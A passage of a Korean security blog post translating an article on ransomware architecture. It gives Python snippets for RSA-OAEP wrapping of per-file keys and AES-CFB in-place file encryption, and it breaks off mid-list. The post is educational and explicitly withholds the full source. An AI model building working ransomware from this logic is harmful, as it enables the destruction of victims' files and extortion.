              <p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! idioth&#xC785;&#xB2C8;&#xB2E4;. &#xAE38;&#xACE0; &#xAE38;&#xC5C8;&#xB358; &#xC911;&#xAC04;&#xACE0;&#xC0AC; &#xAE30;&#xAC04;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC81C; &#xC911;&#xAC04;&#xACE0;&#xC0AC; &#xAE30;&#xAC04;&#xC740; &#xB354; &#xAE38;&#xC5B4;&#xC11C; &#xC544;&#xC9C1; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC558;&#xB124;&#xC694;. &#xC2DC;&#xD5D8; &#xD558;&#xB098;&#xC640; &#xB300;&#xCCB4; &#xACFC;&#xC81C; 3&#xAC1C;&#xAC00; &#xB0A8;&#xC544;&#xC788;&#xB294; &#xC0B6;&#xC785;&#xB2C8;&#xB2E4;. &#xAC8C;&#xB2E4;&#xAC00; &#xACFC;&#xBAA9; &#xD558;&#xB098;&#xB294; &#xC591;&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xC544;&#xC11C; &#xC120;&#xD0DD;&#xACFC; &#xC9D1;&#xC911;&#xC744; &#xD588;&#xB294;&#xB370; &#xC81C;&#xAC00; &#xC120;&#xD0DD;&#xD55C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; 12 &#xBB38;&#xC81C; &#xC911; &#xD55C; &#xBB38;&#xC81C; &#xB098;&#xC654;&#xB124;&#xC694;. 10&#xC810; &#xBC11;&#xC73C;&#xB85C; &#xBC1B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;</p>
<p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled.png" srcset="/img/loading.gif" alt></p>
<p>&#xC774;&#xBBF8; &#xC9C0;&#xB098;&#xAC04; &#xC77C; &#xD6C4;&#xD68C;&#xD558;&#xC9C0; &#xC54A;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xAE30;&#xB9D0; &#xB54C; &#xB354; &#xC798;&#xD558;&#xBA74; &#xB418;&#xB2C8;&#xAE4C;&#xC694;^^. &#xC7A1;&#xB2F4;&#xC774; &#xAE38;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC800;&#xBC88; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0; &#xC774;&#xC5B4;&#xC11C; &#xD30C;&#xD2B8; 2&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p>&#xC774;&#xC804; &#xAC8C;&#xC2DC;&#xAE00; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;: <a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">[Translation] Architecture of Ransomware Part 1</a></p>
<hr>
<blockquote>
<p>&#xC6D0;&#xBB38; &#xAE00; : <a target="_blank" rel="external nofollow noopener noreferrer" href="https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee">Architecture of a ransomware (2/2)</a></p>
</blockquote>
<p><a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">Part 1</a>&#xC5D0;&#xC11C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xB370; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC694;&#xD55C; &#xAC1C;&#xB150;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB2E4;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xAC1C;&#xB150;&#xB4E4;&#xC744; &#xBCF4;&#xC5EC;&#xC904; &#xAC83;&#xC774;&#xB2E4;. &#xB610;&#xD55C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC704;&#xD55C; pycryptodome &#xD30C;&#xC774;&#xC36C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC0AC;&#xC6A9;&#xBC95;&#xB3C4; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xB2E4;. &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD0A4;&#xB514;&#xB4E4;&#xC774; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xC804;&#xCCB4; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xC62C;&#xB9AC;&#xC9C4; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;. &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC758; &#xBAA9;&#xC801;&#xC740; &#xC545;&#xC131; &#xD589;&#xC704;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB77C;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC2DD;&#xC744; &#xACF5;&#xC720;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p>
<h1 id="&#xC77C;&#xBC18;&#xC801;&#xC778;-&#xACE0;&#xB824;-&#xC0AC;&#xD56D;"><a href="#&#xC77C;&#xBC18;&#xC801;&#xC778;-&#xACE0;&#xB824;-&#xC0AC;&#xD56D;" class="headerlink" title="&#xC77C;&#xBC18;&#xC801;&#xC778; &#xACE0;&#xB824; &#xC0AC;&#xD56D;"></a>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xACE0;&#xB824; &#xC0AC;&#xD56D;</h1><p>&#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC5D0; &#xAD00;&#xD574;&#xC11C; &#xCC3E;&#xC544;&#xBCF4;&#xB2E4;&#xAC00; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------">Tarc&#xED;sio Marinho</a>&#xAC00; &#xAC1C;&#xBC1C;&#xD55C; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/tarcisio-marinho/GonnaCry">GonnaCry</a>&#xB77C;&#xB294; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. &#xCF54;&#xB4DC;&#xAC00; &#xB9E4;&#xC6B0; &#xBD84;&#xBA85;&#xD558;&#xBA70; &#xC77D;&#xC5B4; &#xBCF4;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xD55C;&#xB2E4;.</p>
<p>&#xADF8;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; &#x201C;management side&#x201D;&#xB97C; &#xC704;&#xD55C; &#xBAA8;&#xB4E0; &#xCF54;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;. &#xADF8;&#xB294; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xAC10;&#xC5FC;&#xB41C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xB294; &#xD574;&#xCEE4; &#xCE21; &#xC11C;&#xBC84;&#xB97C; &#xCF54;&#xB529;&#xD588;&#xB2E4;.</p>
<p>&#xD544;&#xC790;&#xB294; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xBC30;&#xC6B0;&#xAE30; &#xC704;&#xD574; &#xBAA8;&#xB4E0; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xC600;&#xACE0;, &#xC2E4;&#xC81C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB450; &#xB2E4;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC740; &#xB2E4;&#xB8E8;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. payment&#xB97C; &#xB4F1;&#xB85D;&#xD558;&#xACE0; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xC790;&#xB3D9;&#xD654; &#xC11C;&#xBE44;&#xC2A4;, victim&#xACFC; &#xC9C1;&#xC811; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD558;&#xB294; &#xD1A0;&#xB974; &#xC774;&#xBA54;&#xC77C; &#xC8FC;&#xC18C;, &#xBA87; &#xAC1C;&#xC758; &#xC0D8;&#xD50C; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB4F1;&#xC774; &#xC788;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC740; &#xCEA0;&#xD398;&#xC778;&#xB9C8;&#xB2E4; &#xB2EC;&#xB77C;&#xC11C; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;. &#xB098;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAC10;&#xC5FC; &#xCE21;&#xBA74;&#xC5D0; &#xC8FC;&#xB85C; &#xD3EC;&#xCEE4;&#xC2A4;&#xB97C; &#xB9DE;&#xCD9C; &#xAC83;&#xC774;&#xB2E4;.</p>
<h1 id="&#xC5B8;&#xC5B4;-&#xC120;&#xD0DD;"><a href="#&#xC5B8;&#xC5B4;-&#xC120;&#xD0DD;" class="headerlink" title="&#xC5B8;&#xC5B4; &#xC120;&#xD0DD;"></a>&#xC5B8;&#xC5B4; &#xC120;&#xD0DD;</h1><p>&#xD544;&#xC790;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; &#xD30C;&#xC774;&#xC36C;&#xC744; &#xC120;&#xD0DD;&#xD588;&#xB2E4;. &#xC8FC;&#xC694;&#xD55C; &#xC774;&#xC720;&#xB294; &#x3139;&#x3147; &#xC77D;&#xAE30; &#xC27D;&#xACE0; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC26C;&#xC6B0;&#xB2C8;&#xAE4C;.</p>
<p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%201.png" srcset="/img/loading.gif" alt></p>
<p><code>os.system</code>&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C; OS&#xBCC4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD06C;&#xB85C;&#xC2A4; &#xD50C;&#xB7AB;&#xD3FC; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;. &#xB610;&#xD55C; &#xC18D;&#xB3C4;&#xAC00; &#xBE60;&#xB974;&#xACE0; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC788;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC; &#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; &#xB9AC;&#xBC84;&#xC2F1;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;.</p>
<p>&#xD30C;&#xC774;&#xC36C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC120;&#xD0DD;&#xD560; &#xB54C; &#xB3D9;&#xC77C;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xB294; &#xAC78; &#xC5EC;&#xB7EC; &#xAC1C; &#xCC3E;&#xC544;&#xB77C;. &#xAC01;&#xAC01;&#xC758; &#xAC83;&#xC744; &#xC5F0;&#xAD6C;&#xD558;&#xACE0; &#xAC00;&#xC7A5; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC554;&#xD638;&#xD654;&#xCC98;&#xB7FC; &#xBE60;&#xB974;&#xAC8C; &#xBCC0;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC88B;&#xC740; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC774;&#xB2E4;. &#xC624;&#xB798;&#xB41C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAC70;&#xB098; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/">Lockcrypt</a>&#xCC98;&#xB7FC; &#xC790;&#xCCB4; &#xAC1C;&#xBC1C;&#xD55C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC0AC;&#xC6A9;(&#xD558;&#xC9C0; &#xB9C8;)&#xD558;&#xBA74; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xBCF5;&#xD638;&#xD654;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.  &#xC6B0;&#xB9AC;&#xB294; &#xC798; &#xC54C;&#xB824;&#xC9C4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://pypi.org/project/pycryptodome/">pycryptodome</a>&#xACFC; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.python.org/3/library/secrets.html">secrets</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p>
<blockquote>
<p>Note: &#xC2E4;&#xC81C;&#xB85C; &#xBE44;&#xB300;&#xCE6D;+&#xB300;&#xCE6D; &#xC554;&#xD638;&#xD654;&#xB97C; &#xACB0;&#xD569;&#xD55C; wrapper&#xAC00; &#xC788;&#xC9C0;&#xB9CC; &#xAC1C;&#xB150;&#xC744; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD574; pycryptodome&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xAC01; &#xAE30;&#xB2A5;&#xC744; &#xAD6C;&#xD604;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p>
</blockquote>
<p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%202.png" srcset="/img/loading.gif" alt></p>
<h1 id="&#xD544;&#xC694;&#xD55C;-&#xAE30;&#xB2A5;-&#xC694;&#xC57D;"><a href="#&#xD544;&#xC694;&#xD55C;-&#xAE30;&#xB2A5;-&#xC694;&#xC57D;" class="headerlink" title="&#xD544;&#xC694;&#xD55C; &#xAE30;&#xB2A5; &#xC694;&#xC57D;"></a>&#xD544;&#xC694;&#xD55C; &#xAE30;&#xB2A5; &#xC694;&#xC57D;</h1><ul>
<li><code>generate32ByteKey()</code>: &#xB79C;&#xB364;&#xD55C; 32&#xBC14;&#xC774;&#xD2B8; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xC774;&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB2E4;. <code>/dev/urandom</code>&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAE01;&#xC5B4;&#xC640;&#xC11C; <code>sha256sum</code>&#xC744; &#xD558;&#xBA74; &#xB418;&#xC9C0;&#xB9CC; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0; &#xD55C;&#xC815;&#xC801;&#xC774;&#xBA70; &#xD06C;&#xB85C;&#xC2A4; &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xACE0; &#xC2F6;&#xC73C;&#xBBC0;&#xB85C; secrets &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;. <code>secrets.token_hex(32)</code>&#xB97C; &#xD1B5;&#xD574; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li>
<li><code>rsaEncryptSecret(string, publicKey)</code>: public key&#xB97C; &#xAC00;&#xC9C0;&#xACE0; secret&#xC744; &#xBE44;&#xB300;&#xCE6D; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;(private key&#xB97C; &#xD1B5;&#xD574;&#xC11C;&#xB9CC; &#xBCF5;&#xD638;&#xD654;&#xB428;). &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xAC01; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; &#xC0DD;&#xC131;&#xB41C; &#xB300;&#xCE6D; &#xD0A4;&#xB97C; publicKey&#xB85C; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xAC01; &#xD30C;&#xC77C;&#xC758; &#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xB824;&#xBA74; &#xC6B0;&#xB9AC;&#xC758; private key&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;.</li>
<li><code>rsaDecryptSecret(secret, privateKey)</code>: private &#xBE44;&#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654;&#xB41C; &#xB300;&#xCE6D;&#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</li>
<li><code>symEncryptFile(publicKey, file)</code>: &#xC554;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C; &#xAC00;&#xC7A5; &#xBCF5;&#xC7A1;&#xD55C; &#xBD80;&#xBD84;&#xC774;&#xB2E4;. &#xC544;&#xB798;&#xC5D0; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD560; &#xAC70;&#xC9C0;&#xB9CC;, &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xD568;&#xC218;&#xB2E4;.</li>
<li><code>symDecryptFile(privateKey, file)</code>: &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</li>
<li><code>symEncryptDirectory(publicKey, dir)</code>: &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xBC1B;&#xC544;&#xC11C; &#xB0B4;&#xBD80;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xAC00;&#xC838;&#xC628;&#xB2E4;. &#xADF8; &#xD6C4; <code>symEncryptFile</code>&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;.</li>
<li><code>symDecryptDirectory(privateKey, dir)</code>: <code>symEncryptDirectory</code>&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xC9C0;&#xB9CC; &#xBC18;&#xB300;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xD55C;&#xB2E4;.</li>
</ul>
<h1 id="rsaEncryptSecret"><a href="#rsaEncryptSecret" class="headerlink" title="rsaEncryptSecret"></a>rsaEncryptSecret</h1><p>RSA&#xB97C; &#xD1B5;&#xD574; secret key&#xB97C; &#xC554;&#xD638;&#xD654;&#xD560; &#xAC83;&#xC774;&#xB2E4;. RSA&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xB79C;&#xB364;&#xC131; &#xC5C6;&#xC774; &#xC554;&#xD638;&#xD654; &#xB418;&#xBBC0;&#xB85C; &#xAE30;&#xBCF8;&#xC801;&#xC778; RSA&#xC5D0; &#xB79C;&#xB364;&#xC131;&#xACFC; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Trapdoor_function">one-way permutation trapdoor</a>&#xB97C; &#xCD94;&#xAC00;&#xD55C; padding scheme&#xC778; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding(OAEP)</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;. OAEP&#xC640; &#xAC19;&#xC774; RSA&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xACB0;&#xACFC; cypher &#xD06C;&#xAE30;&#xB294; modulus(<code>key size/8</code>)&#xACFC; &#xAC19;&#xC544;&#xC57C; &#xD55C;&#xB2E4;. 2048bit RSA&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; 256 bytes&#xC758; resulting cyphertext&#xAC00; &#xB098;&#xC640;&#xC57C; &#xD55C;&#xB2E4;.</p>
<p>&#xC774;&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C; &#xCF54;&#xB4DC;&#xC774;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaEncryptSecret</span>(<span class="hljs-params">string, publicKey</span>):</span>
	  public_key = get_key(publicKey, <span class="hljs-literal">None</span>)
	  <span class="hljs-comment"># Create the cipher object</span>
	  cipher_rsa = PKCS1_OAEP.new(public_key)
	  <span class="hljs-comment"># We need to encode the string to work with bytes instead of chars</span>
	  bytestrings = str.encode(string)
	  cipher_text = cipher_rsa.encrypt(bytestrings)
	  <span class="hljs-comment">#At this point the cipher_text should be 256 bytes in length</span>
	  <span class="hljs-comment"># We&apos;ll base64 encode it for convenience</span>
	  <span class="hljs-comment"># Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding </span>
	  <span class="hljs-keyword">return</span> base64.b64encode(cipher_text)</code></pre>
<p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%203.png" srcset="/img/loading.gif" alt></p>
<p>Source: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://stackoverflow.com/questions/13378815/base64-length-calculation">https://stackoverflow.com/questions/13378815/base64-length-calculation</a></p>
<h1 id="RsaDecryptSecret"><a href="#RsaDecryptSecret" class="headerlink" title="RsaDecryptSecret"></a>RsaDecryptSecret</h1><p>&#xC81C;&#xACF5;&#xB41C; secret key&#xB85C; cipher text&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaDecryptSecret</span>(<span class="hljs-params">string, privateKey</span>):</span>
	  <span class="hljs-comment"># We firts import the private Key</span>
	  private_key = get_key(privateKey, <span class="hljs-literal">None</span>)
	  <span class="hljs-comment"># Decode the base64 encoded string</span>
	  base64DecodedSecret = base64.b64decode(string)
	  <span class="hljs-comment"># create the cipher object</span>
	  cipher_rsa = PKCS1_OAEP.new(private_key)
	  <span class="hljs-comment"># Decrypt the content</span>
	  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)
	  <span class="hljs-comment"># Remember to convert the decoded cipher from bytes to string</span>
	  decryptedSecret = decryptedBytestrings.decode()
	  <span class="hljs-keyword">return</span> decryptedSecret</code></pre>
<h1 id="SymEncryptFile"><a href="#SymEncryptFile" class="headerlink" title="SymEncryptFile"></a>SymEncryptFile</h1><p>&#xC8FC;&#xC694; &#xC554;&#xD638;&#xD654; &#xD568;&#xC218;&#xC774;&#xBA70; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;.</p>
<ol>
<li><p>publicKey&#xC640; file path&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symEncryptFile</span>(<span class="hljs-params">publicKey, file</span>):</span></code></pre>
</li>
<li><p>&#xD2B9;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xB79C;&#xB364; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python">key = generateKey()</code></pre>
</li>
<li><p>publicKey&#xB85C; &#xB79C;&#xB364; &#xD0A4;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python">encryptedKey = rsaEncryptSecret(key, publicKey)</code></pre>
</li>
<li><p>&#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC0AC;&#xC774;&#xC988;(n byte)&#xB97C; &#xC815;&#xC758;&#xD55C;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; 1MB&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre>
</li>
<li><p>&#xD30C;&#xC77C;&#xC774; &#xC774;&#xBBF8; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC774;&#xBBF8; &#xB418;&#xC5B4;&#xC788;&#xC744; &#xACBD;&#xC6B0; &#xBB34;&#xC2DC;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswitch(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):
		print(<span class="hljs-string">&apos;File is already encrypted, skipping&apos;</span>)
		<span class="hljs-keyword">return</span></code></pre>
</li>
<li><p>&#xD30C;&#xC77C;&#xC758; &#xCCAB; n &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD558;&#xACE0; content&#xB97C; overwrite &#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-comment"># Open the input and output files</span>
		input_file = open(file, <span class="hljs-string">&apos;r+b&apos;</span>)
		print(<span class="hljs-string">&quot;Encrypting file: &quot;</span>+ file)
		output_file = open(file + <span class="hljs-string">&apos;.&apos;</span> + cryptoName, <span class="hljs-string">&apos;w+b&apos;</span>)

<span class="hljs-comment"># Create the cipher object and encrypt the data</span>
		cipher_encrypt = AES.new(key, AES.MODE_CFB)

<span class="hljs-comment"># Encrypt file first</span>
		input_file.seek(<span class="hljs-number">0</span>)
		buffer = input_file.read(buffer_size)
		ciphered_bytes = cipher_encrypt.encrypt(buffer)

input_file.seek(<span class="hljs-number">0</span>)
input_file.write(ciphered_bytes)</code></pre>
<p> <img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%204.png" srcset="/img/loading.gif" alt></p>
</li>
<li><p>&#xD30C;&#xC77C;&#xC758; &#xB05D;&#xC5D0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xB79C;&#xB364; &#xD0A4;&#xB97C; &#xCD94;&#xAC00;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)
input_file.write(encryptedKey.encode())</code></pre>
</li>
<li><p>&#xD30C;&#xC77C;&#xC758; &#xB05D;&#xC5D0; AES IV(initialization vector)&#xB97C; &#xCD94;&#xAC00;&#xD55C;&#xB2E4;.</p>
 <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)
input_file.write(cipher_encrypt.iv)</code></pre>
</li>
